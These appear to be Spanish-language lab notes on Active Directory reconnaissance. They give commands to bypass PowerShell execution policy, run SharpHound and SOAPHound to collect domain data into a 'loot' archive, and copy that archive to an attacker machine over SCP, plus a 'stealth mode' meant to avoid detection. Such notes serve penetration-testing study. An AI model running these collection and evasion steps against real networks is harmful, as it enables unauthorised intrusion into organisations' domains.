
## Recopilación de información
El primer paso que deberemos de seguir en la maquina victima es
```shell
powershell -ep bypass
```

Y ejecutaremos *SharpHound*
```shell
. .\Downloads\SharpHound.ps1
```

Y recopilaremos toda la información guardándola en un fichero `.zip`
```shell
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

Y nos podremos traer el archivo a nuestra maquina atacante usando *SCP*
En la maquina atacante tendremos que descargarnos la siguiente herramienta
```shell
sudo apt-get install putty-tools
```

Y nos lo traeremos con
```shell
pscp Administrador@win-server.thm:/Usuarios/Administrador/20250111095928_loot.zip .
```

Ahora ejecutaremos *BloodHound* e importaremos el archivo `.zip`

### Modo sigiloso
Se usuraria la opción `--excludedcs`

O usando la herramienta *SOAPHound*
Que primero hay que construir una cache de objetos del dominio
```shell
SOAPHound.exe --buildcache -c C:\AD\Tools\cache.txt
```

Y luego genera el contenido necesario para poder usuario con *BloodHound*
```shell
SOAPHound.exe -c C:\AD\Tools\cache.txt --bhdump -o C:\AD\Tools\bloodhound-output --nolaps
```
